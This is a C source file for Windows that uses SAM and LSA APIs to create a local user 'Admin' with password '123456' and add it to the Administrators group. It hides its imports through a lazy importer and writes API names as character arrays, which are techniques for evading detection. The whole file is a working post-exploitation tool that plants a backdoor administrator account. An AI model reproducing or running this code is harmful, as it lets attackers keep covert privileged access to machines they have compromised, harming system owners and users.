#include <windows.h>
#include <Ntsecapi.h>
#include <subauth.h>
#include <stdio.h>
#include "lazy_importer.hpp"
#include <LM.h>

typedef  enum _USER_INFORMATION_CLASS
{
	UserGeneralInformation = 1,
	UserPreferencesInformation = 2,
	UserLogonInformation = 3,
	UserLogonHoursInformation = 4,
	UserAccountInformation = 5,
	UserNameInformation = 6,
	UserAccountNameInformation = 7,
	UserFullNameInformation = 8,
	UserPrimaryGroupInformation = 9,
	UserHomeInformation = 10,
	UserScriptInformation = 11,
	UserProfileInformation = 12,
	UserAdminCommentInformation = 13,
	UserWorkStationsInformation = 14,
	UserControlInformation = 16,
	UserExpiresInformation = 17,
	UserInternal1Information = 18,
	UserParametersInformation = 20,
	UserAllInformation = 21,
	UserInternal4Information = 23,
	UserInternal5Information = 24,
	UserInternal4InformationNew = 25,
	UserInternal5InformationNew = 26
} USER_INFORMATION_CLASS,* PUSER_INFORMATION_CLASS;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES,*POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* pSamConnect)(IN OUT PUNICODE_STRING ServerName OPTIONAL, OUT PSAM_HANDLE ServerHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(NTAPI* pSamOpenDomain)(IN SAM_HANDLE ServerHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT PSAM_HANDLE DomainHandle);
typedef NTSTATUS(NTAPI* pSamCreateUser2InDomain)(IN SAM_HANDLE DomainHandle,IN PUNICODE_STRING AccountName,IN ULONG AccountType,IN ACCESS_MASK DesiredAccess,OUT PSAM_HANDLE UserHandle,OUT PULONG GrantedAccess,OUT PULONG RelativeId);
typedef NTSTATUS(NTAPI* pSamSetInformationUser)(IN SAM_HANDLE UserHandle, IN USER_INFORMATION_CLASS UserInformationClass, IN PVOID Buffer);
typedef NTSTATUS(NTAPI* pSamQuerySecurityObject)(IN SAM_HANDLE ObjectHandle,IN SECURITY_INFORMATION SecurityInformation,OUT PSECURITY_DESCRIPTOR* SecurityDescriptor);
typedef NTSYSAPI VOID(NTAPI* pRtlInitUnicodeString)(PUNICODE_STRING DestinationString,PCWSTR SourceString);
typedef int(WINAPI* pNetLocalGroupAddMembers)(LPCWSTR servername, LPCWSTR groupname, DWORD level, LPBYTE buf, DWORD totalentries);

#define SAM_SERVER_CONNECT   0x00000001
#define SAM_SERVER_LOOKUP_DOMAIN   0x00000020

#define DOMAIN_CREATE_USER   0x00000010
#define DOMAIN_LOOKUP   0x00000200
#define DOMAIN_READ_PASSWORD_PARAMETERS   0x00000001

#define USER_READ_GENERAL   0x00000001
#define USER_READ_PREFERENCES   0x00000002
#define USER_WRITE_PREFERENCES   0x00000004
#define USER_READ_LOGON   0x00000008
#define USER_READ_ACCOUNT   0x00000010
#define USER_WRITE_ACCOUNT   0x00000020
#define USER_CHANGE_PASSWORD   0x00000040
#define USER_FORCE_PASSWORD_CHANGE   0x00000080
#define USER_LIST_GROUPS   0x00000100
#define USER_READ_GROUP_INFORMATION   0x00000200
#define USER_WRITE_GROUP_INFORMATION   0x00000400

#define USER_ALL_ACCESS	(STANDARD_RIGHTS_REQUIRED |\
                         USER_READ_GENERAL |\
                         USER_READ_PREFERENCES |\
                         USER_WRITE_PREFERENCES |\
                         USER_READ_LOGON |\
                         USER_READ_ACCOUNT |\
                         USER_WRITE_ACCOUNT |\
                         USER_CHANGE_PASSWORD |\
                         USER_FORCE_PASSWORD_CHANGE |\
                         USER_LIST_GROUPS |\
                         USER_READ_GROUP_INFORMATION |\
                         USER_WRITE_GROUP_INFORMATION)

#define USER_ALL_NTPASSWORDPRESENT   0x01000000

typedef HMODULE(WINAPI* Fn_LoadLibraryA)(_In_ LPCSTR lpLibFileName);


int wmain(int argc, wchar_t* argv[])
{
	UNICODE_STRING UserName;
	UNICODE_STRING PassWord;
	HANDLE ServerHandle = NULL;
	HANDLE DomainHandle = NULL;
	HANDLE UserHandle = NULL;
	ULONG GrantedAccess;
	ULONG RelativeId;
	NTSTATUS Status = NULL;
	HMODULE hSamlib = NULL;
	HMODULE hNtdll = NULL;
	HMODULE hNetapi32 = NULL;
	LSA_HANDLE hPolicy = NULL;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PPOLICY_ACCOUNT_DOMAIN_INFO DomainInfo = NULL;
	USER_ALL_INFORMATION uai = { 0 };

	Fn_LoadLibraryA fn_LoadLibraryA = (Fn_LoadLibraryA)LI_FN(LoadLibraryA).in(LI_MODULE("kernel32.dll").cached());

	char s_ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
	char s_netapi32[] = { 'n','e','t','a','p','i','3','2','.','d','l','l',0 };
	char s_samlib[] = { 's','a','m','l','i','b','.','d','l','l',0 };
	hNtdll = fn_LoadLibraryA(s_ntdll);
	hNetapi32 = fn_LoadLibraryA(s_netapi32);
	hSamlib = fn_LoadLibraryA(s_samlib);

	char s_SamConnect[] = { 'S','a','m','C','o','n','n','e','c','t',0 };
	char s_SamOpenDomain[] = { 'S','a','m','O','p','e','n','D','o','m','a','i','n',0 };
	char s_SamCreateUser2InDomain[] = { 'S','a','m','C','r','e','a','t','e','U','s','e','r','2','I','n','D','o','m','a','i','n', 0};
	char s_SamSetInformationUser[] = { 'S','a','m','S','e','t','I','n','f','o','r','m','a','t','i','o','n','U','s','e','r',0 };
	char s_SamQuerySecurityObject[] = { 'S','a','m','Q','u','e','r','y','S','e','c','u','r','i','t','y','O','b','j','e','c','t',0 };
	char s_RtlInitUnicodeString[] = { 'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g',0 };
	char s_NetLocalGroupAddMembers[] = { 'N','e','t','L','o','c','a','l','G','r','o','u','p','A','d','d','M','e','m','b','e','r','s',0 };

	pSamConnect SamConnect = (pSamConnect)GetProcAddress(hSamlib, s_SamConnect);
	pSamOpenDomain SamOpenDomain = (pSamOpenDomain)GetProcAddress(hSamlib, s_SamOpenDomain);
	pSamCreateUser2InDomain SamCreateUser2InDomain = (pSamCreateUser2InDomain)GetProcAddress(hSamlib, s_SamCreateUser2InDomain);
	pSamSetInformationUser SamSetInformationUser = (pSamSetInformationUser)GetProcAddress(hSamlib, s_SamSetInformationUser);
	pSamQuerySecurityObject SamQuerySecurityObject = (pSamQuerySecurityObject)GetProcAddress(hSamlib, s_SamQuerySecurityObject);
	pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, s_RtlInitUnicodeString);
	pNetLocalGroupAddMembers my_NetLocalGroupAddMembers = (pNetLocalGroupAddMembers)GetProcAddress(hNetapi32, s_NetLocalGroupAddMembers);

	RtlInitUnicodeString(&UserName, L"Admin");
	RtlInitUnicodeString(&PassWord, L"123456");

	Status = SamConnect(NULL, &ServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, NULL);
	Status = LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy);
	Status = LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID*)&DomainInfo);

	Status = SamOpenDomain(ServerHandle, DOMAIN_CREATE_USER | DOMAIN_LOOKUP | DOMAIN_READ_PASSWORD_PARAMETERS ,DomainInfo->DomainSid,&DomainHandle);  
	Status = SamCreateUser2InDomain(DomainHandle,&UserName,USER_NORMAL_ACCOUNT,USER_ALL_ACCESS | DELETE | WRITE_DAC,&UserHandle, &GrantedAccess, &RelativeId);
	if (!Status)
	{
		printf("User Add Success\r\n");
	}

	RtlInitUnicodeString(&uai.NtPassword, PassWord.Buffer);
	uai.NtPasswordPresent = TRUE;
	uai.WhichFields |= USER_ALL_NTPASSWORDPRESENT;


	Status = SamSetInformationUser(UserHandle,UserAllInformation,&uai);


	wchar_t Username[256] = L"Admin";
	LOCALGROUP_MEMBERS_INFO_3 LGMInfo;
	LGMInfo.lgrmi3_domainandname = Username;
	my_NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&LGMInfo, 1);
	system("pause");

	return 0;
}